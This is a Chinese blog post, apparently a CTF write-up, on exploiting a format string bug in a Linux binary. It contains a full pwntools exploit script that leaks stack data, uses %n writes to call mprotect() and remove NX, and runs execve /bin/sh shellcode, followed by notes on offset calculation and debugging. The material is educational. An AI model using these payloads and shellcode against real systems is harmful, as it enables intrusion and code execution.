---
title: Format String in Linux
date: 2016-10-19
tag: Bin
layout: post
---

## 0x00 General

虽然很早就接触了格式化字符串攻击，但这一次却是第一次练习。之前虽然也用过，但是仅仅是用来leak栈上的信息而已(429CTF的leak绕过stack protect)。

这一次是全程的格式化字符串攻击：信息泄露，盖写返回地址，写入func参数。

文件除了不常见(么?)的Stack Protector以外，NX和ASLR都是开启了的(默认ASLR是开的吧?)，但是内部把`mprotect()`函数包含了进来，算作是减少了不少难度。

主要思路：
    
```bash
leak stack info -> write ret addr & other argument ->
exec mprotect() => remove NX ->
write shellcode & ret addr -> get shell
```

## 0x01 Exp

先把脚本贴上...

``` python
#!/usr/bin/env python

from pwn import *

offest = - 0x128
str_enter = "STjJaOEwLszsLwRy\n"

shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
shellcode += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
shellcode += "\x0b\xcd\x80"

#p = remote('219.146.15.117',8000)
p = process('./pwn1')

print "Moe> Leaking information..."
leak_code = '%x.'*70 + '%x'
p.recvuntil('KEY:')
p.send(leak_code + '\n')
p.recvuntil('ERROR:')
info_leak = p.recvuntil('.8048662')

info_leak = info_leak.split('.')
stack_esp = int(info_leak[-2],16) + offest
stack_ebp = int(info_leak[-2],16)
stack_ret = stack_ebp - 0xc

print 'esp:',hex(stack_esp)
print 'ebp:',hex(stack_ebp)
print 'ret:',hex(stack_ret)

print "Moe> Remove NX protect..."
#offset into %x is 0x0b(11)
rmNX_addr = stack_esp & 0xFFFFF000
reNX_size = 0x1000
rmNX_flag = 0x7
#addr_mprotect = 0x08048420
#addr_start = 0x08048490

print 'reNX_addr:',hex(rmNX_addr)

#check if rmNX_addr is able to write
if (rmNX_addr&0xFFFF) == 0:
    print "[Error] rmNX's addr isn't write this time.\n[>_<] Try again..."
    exit(0)

print "Moe::> write mprotect addr..."
payload = p32(stack_ret+0x0) + '%x%33000x%813x%n'
p.recvuntil('KEY:')
p.sendline(payload)
payload = p32(stack_ret+0x2) + '%x%2000x%41x%n'
p.recvuntil('KEY:')
p.sendline(payload)

print "Moe::> write start addr for again"
payload = p32(stack_ret+0x4+0x0) + '%x%33000x%925x%n'
p.recvuntil('KEY:')
p.sendline(payload)
payload = p32(stack_ret+0x4+0x2) + '%x%2000x%41x%n'
p.recvuntil('KEY:')
p.sendline(payload)

print "Moe::> write func's argument..."
#write stack's addr
payload = p32(stack_ret+0x8+0x0) + '%x%x' + '%' + str((rmNX_addr&0xFFFF)-19) + 'x%n'
p.recvuntil('KEY:')
p.sendline(payload)
payload = p32(stack_ret+0x8+0x2) + '%x%x' + '%' + str((rmNX_addr>>16)-19) + 'x%n'
p.recvuntil('KEY:')
p.sendline(payload)
#write size
payload = p32(stack_ret+0xc+0x0) + '%4076x%x%x%n'
p.recvuntil('KEY:')
p.sendline(payload)
#write flag
payload = p32(stack_ret+0x10+0x2) + '%x%x%x%n'
p.recvuntil('KEY:')
p.sendline(payload)
payload = p32(stack_ret+0x10-0x1) + '%1772x%x%x%n'
p.recvuntil('KEY:')
p.sendline(payload)

print "Moe::> exec func..."
p.recvuntil('KEY:')
p.send(str_enter)
p.recvuntil('okey,you entered it.')
p.recvuntil('KEY:')
p.send("AAAABBBB\n")

print "Moe> rmNX success."
print "Moe> write shellcode..."
#new stack offset -0xa0
stack_offset = -0xa0
stack_ret = stack_ret + stack_offset
stack_buff = stack_esp + stack_offset + 16 + 0x20
print 'new_ret:',hex(stack_ret)
print 'addr_buff:',hex(stack_buff-0x20)
#write shellcode's addr
payload = p32(stack_ret+0x0) + '%x%x' + '%' + str((stack_buff&0xFFFF)-19) + 'x%n'
p.recvuntil('KEY:')
p.sendline(payload)
payload = p32(stack_ret+0x2) + '%x%x' + '%' + str((stack_buff>>16)-19) + 'x%n'
p.recvuntil('KEY:')
p.sendline(payload)
#write shellcode
payload = 'A'*0x20 + shellcode
p.recvuntil('KEY:')
p.sendline(payload)
#exec shellcode
payload = str_enter
p.recvuntil('KEY:')
p.sendline(payload)
p.recvuntil('okey,you entered it.')
print 'Moe> exec shellcode...'

p.interactive()
```

## 0x02 Notes

### 1. exp有个部分会检测一个数据的低2字节是否为零，否则退出 [line 41~44]

这个是后来才发现的致命问题。主要是因为，这个数据是栈的一个地址，因为ASLR，地址会随机变化。而exp全程是依靠格式化字符串进行写入的。有一种情况就是正好这个地址低两字节是零(0xFFFF0000)，而全零是很难写入的(可以做到，见下面关于"参数flag的写入")，要是仍旧依赖非零的预定方法，会导致奇怪的数据写入(之前就因为这个问题被困惑了好久)。

要是别的函数就算了，但这个参数用于mprotect()的执行，不允许参数1bit的偏差(见Learn部分的"mprotect()")。所以，熟练的办法是干脆退出：抛弃这次执行。再开一让ASLR分配个新地址即可(一次不行就两次，两次不行就双线程...)。

### 2. flag参数的写入 [line 74~80]

size的值是固定的：0x1000。虽然存在地位要写零的问题，但是因为程序本身的逻辑，size的地址的数值默认为0，所以只要正常的高位写入`00 01`(len=0x100)即可。

flag参数也是个固定值：111b(0x7)。但是经过测试，每次至少写入0x1b的数值。办法就是用错位的办法：

```
<---size-->  <--flag--->
00 01 00 00  07 00 00 00
00 01 02 03  04 05 06 07 <-tags
low addr------>high addr
```

上面是写入成功的栈上数值状态。正常的话是在`07`的地址进行写入。这样应该输入len=0x07的数值，但是如上所说，做不到。我们可以在`07`前面的`00`(tags=03)的地址进行写入，这样就构成了`00 07 00 00`(len=0x700)，变成了一个舒服的数值。

但是：问题还没解决。flag处默认是有完整的4字节数据的，后面存在无法写0问题(最少写len=0x1b嘛)。方法就是相互覆盖：

1. 第一次，我们在`07`后面后面的`00`(tag=06)地址处随便写入大数值(比如最小值0x1b00)，保证最后一字节为0
2. 第二次，我们用错位法写入`07`，这时因为格式化字符串特性，`07`后面的两个字节(tags=05&06)又被盖为0。这样地位全0达成。

```
    00 01 00 00  xx xx xx xx
--> 00 01 00 00  xx xx 1b 00
--> 00 01 00[00  07 00 00]00
//方括号内即写入07覆盖的数据区
result： 00 01 00 00 07 00 00 00
```
So，有时候麻烦也是一种特性，善加利用反而是key牌。

### 3. 关于再次satrt

这个也算是ROP，用mprotect()解锁stack后，返回start重新启动了函数来达成再次攻击。

需要注意的是，因为什么原因(管他什么原因[其实是栈平衡问题])，再次start后esp的值发生了变动。但是嘛，因为exp执行逻辑不变，所以每次运行exp后，新esp相对旧esp的偏移量(offset=旧esp-新esp)不变，只需要提前算出来然后修正即可。

### 4. 动态调整格式化字符串写入数值长度

exp中有一部分需要写入动态数值(这个数值是栈地址，因为ASLR的缘故)。怎么办呢？很简单嘛。

```python
#write high addr:
dym_len = （org_len >> 16) - offset_len
#write low addr:
dym_len = (org_len & 0xFFFF) - offset_len
#offset_len是之前算好的长度修正值，用来达成正确的数值写入
payload = '%x%x%x' + '%' + str(dym_len) + 'x' + '%n'
```

这个截取指定区间数据的长度来自二进制文件的汇编常用方式。

其实，格式化字符串中的长度偏移量经常是一样的，好好利用python的语言便利即可。

## 0x03 Other

exp很长...但是重复性很强。因为提供了可以无限次的循环写入，格式化字符串又不破坏栈，所以还是很舒服的。(所以一次完成两次写还是没练习)。

因为循环写的存在，就很暴力的慢慢一点点的写入数据。主要的地方在于计算(测试)正确的输出长度。这里很奇怪的是写了4次之后偏移量方发生了变化，也没仔细研究。

后面有空的话回去写个练习程序做一次完整的方法研究。

### 1. 格式化字符串

* 善用偏移量

格式化字符串的长度控制看着很恶心(其实真的很恶心)，但是还是有好办法的。

先无视输出的烂字符，假定要写入`num`(比如0x100[=256])，就直接输入：如`%x%x%256x%n`。然后gdb调试观察结果。假设结果为`res`，那么偏移量就是`offset = num - res`。之后需要写入数值`X`，那么`input = X + offset`。这里input和例子的256等价。

**注意:计算出偏移量后，需要保证格式的一致性。比如计算offset用的是`%x%x%256x%n`，那么应用offset时就不能用`%x200x%56x%n`这种格式。**

**虽然看似200+56=256，但是：`%x`的数字参数是打印长度。**

**如果`%x`会leak出4字节信息(如89ABCDEF，8个字符)，那么`%8x`和`%x`是等价的！虽然可以手算这个修正值，但是何必呢...**

其他的时候，偏移量也是个优雅且舒服的方式。比如这个exp后面新esp的计算。

在pwn中，数值可能每次都会变，但是只要程序的执行逻辑不变(从开始到现在所执行的代码完全一样or影响数据的部分一样or对数据最终结果影响一样)，offset一般就是固定不变的。这也是汇编层次上的一种概念吧...

* 写入特性

格式化字符串的`%n`一次写4字节(x86，x86\_64会一次写8个字节么?)。而且是int的写法：全整个4字节全部使用，即使写1也把剩下3个字节置0。

所以，正确的完整写入(分两次写完一个4字节长度的话)，是先写高位两个字节，然后写低位两个字节。

这种特性造成的麻烦其实很小。不过善加利用却很强力，可以用相互覆盖的方式成功写入0值。

* 写入限制

如上面"Notes"所说，格式化字符串攻击说起来是：任意地址任意写。但是还是会有数值限制。比如，0的写入和最小数值的写入(一样嘛>\_<)。但这只是要注意的部分，并不是不能解决的东西。

主要的影响便是像exp中那段数值检测(不符合退出)的情况，因为动态数值的写入需求，会导致超越可写数值的情况存在。而这时既定的方法往往会导致诡异的错误发生(比如上面的例子，每次还真的成功写入了**[值得后面研究下呢]**，但是总是写了个奇怪的数字，导致多次修正offset无果直至发现根源)。

所以重点是排查这种特殊情况的发生，然后有针对性的进行修补。

### 2. mprotect()

mprotect()函数的作用很简单(也很复杂)：设置一段内存的权限状态(不可访问，读/写/执行[rwx])。

简易函数原型：

```
mprotect(addr, size, flag)
//flag标记要设置的权限。以二进制位标记。
//rwx状态时，flag=111b，即0x7
```

因为涉及到内存权限，值得熟悉掌握。详细的研究放到另一篇总结详细记录。这里记录要点。

* 关于addr

addr是设置内存范围的起始地址，**必须为内存页大小或为其整数倍**。

经测试，Ubuntu的page\_size为0x1000.

所以使用mprotect()解锁stack的时候，要先对齐目标地址：比如使用`addr & 0xFFFFF000`(page\_size=0x1000时)

否则一定会出错。

* size的大小

size同样为page\_size或其整数倍。

关于page\_size，我忘了怎么计算出的了。最好的办法就是用C写段代码读出。它是定义在头文件中的一个常数(目测为可调整的常数?)

暂时觉得，0x1000应该是个通用值(x86)。

* flag

pwn中的话，flag为0x7(111b)就好了。本来是由宏定义常量设置的，但是编译后的确是0x7。

### 3. 关于gdb的调试

* exp脚本的调试

exp的话设置一个`raw_input()`就好了。关于带计时器的pwn...我觉得直接干掉计时器(修改二进制文件，改成极长的时间)不错。当然，要是熟练掌握zio的gdb附加也可以。pwntools不知道有没有...

要注意的是，要保持调试时exp本身的中断性。简单来说，最后一个执行payload后的`p.send(payload)`之后要有东西拦住exp(比如`raw_input()`or`p.recvuntil()`?)，不然exp会先exit，导致程序本身随之down掉...然后gdb这边就莫名退出了。

* gdb的attach

**要在root下进行attach！**

主要的套路：

```bash
//这里得到进程的PID
root@rabbithuse# ps aux | grep pwn1
PID xxx xxx xxx xxx ...
xxx xxx ........
3946 xxx .... xxx xxx/xxx/pwn1
xxx xxx ........

root@rabbithuse# gdb
...xxx...
...xxx...
...xxx...
gdb attach 3946
//然后就附加好了
//附加时是断在底层的，下个断点然后执行continue(或者直接执行c)命令即可。
```

这个没什么了...被bug调教好了自然熟练

* 程序本身的调试

这个没什么。不过这次折腾一天，总结下来：

**把动态捕获的数据打印出来很有帮助的！**

(这也是为什么别人exp里面总会打印数据的缘故么？)

**--End--**
